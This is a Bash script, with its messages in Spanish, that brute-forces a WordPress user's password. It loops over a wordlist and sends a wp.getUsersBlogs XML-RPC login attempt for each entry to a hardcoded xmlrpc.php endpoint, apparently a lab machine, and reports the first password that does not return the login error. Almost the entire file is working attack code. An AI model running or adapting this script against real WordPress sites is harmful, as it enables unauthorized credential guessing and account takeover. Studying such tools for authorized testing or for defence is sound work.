#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"


function ctrl_c(){
   echo -e "\n\n${redColour}[!] Saliendo...${endColour}\n"
   rm data.xml 2>/dev/null 
	exit 1
}

# Ctrl+C
trap ctrl_c SIGINT

function helpPanel(){
   echo -e "\n${yellowColour}[+] ${grayColour}Uso: ${blueColour}$0 ${turquoiseColour}-u ${grayColour}usuario ${turquoiseColour}-w ${grayColour}ruta_wordlist${endColour}"
   echo -e "\t${turquoiseColour}-u) ${grayColour}Usuario"
   echo -e "\t${turquoiseColour}-w) ${grayColour}Ruta del diccionario de contraseñas"
   echo -e "\t${turquoiseColour}-h) ${grayColour}Muestra este panel de ayuda${endColour}"
	rm data.xml 2>/dev/null
   exit 1
}

function makeXML(){
   username=$1
   wordlist=$2

	cat $wordlist | while read password; do
		xmlFile="""
		<?xml version=\"1.0\" encoding=\"UTF-8\"?>
		<methodCall>
		<methodName>wp.getUsersBlogs</methodName>
		<params>
		<param><value>$username</value></param>
		<param><value>$password</value></param>
		</params>
		</methodCall>
		"""

		echo $xmlFile > data.xml

		response=$(curl -s -X POST "http://loly.lc/wordpress/xmlrpc.php" -d@data.xml)

		if [ ! "$(echo $response | grep -E 'Incorrect username or password.|parse error. not well formed')" ]; then
			echo -e "\n${yellowColour}[+] ${grayColour}La contraseña es ${yellowColour}$password${endColour}"
			rm data.xml
			exit 0
		fi
	done
	rm data.xml 2>/dev/null
	exit 0
}  


declare -i parameter_counter=0


while getopts "u:w:h" arg; do
   case $arg in
      u) username=$OPTARG && let parameter_counter+=1;;
      w) wordlist=$OPTARG && let parameter_counter+=1;;
      h) helpPanel
   esac
done


if [ $parameter_counter -eq 2 ]; then
   if [ -f $wordlist ]; then
		makeXML $username $wordlist		
   else
   	echo -e "\n\n${redColour}[!] El archivo no existe\n${endColour}"
   fi
else
   helpPanel
fi
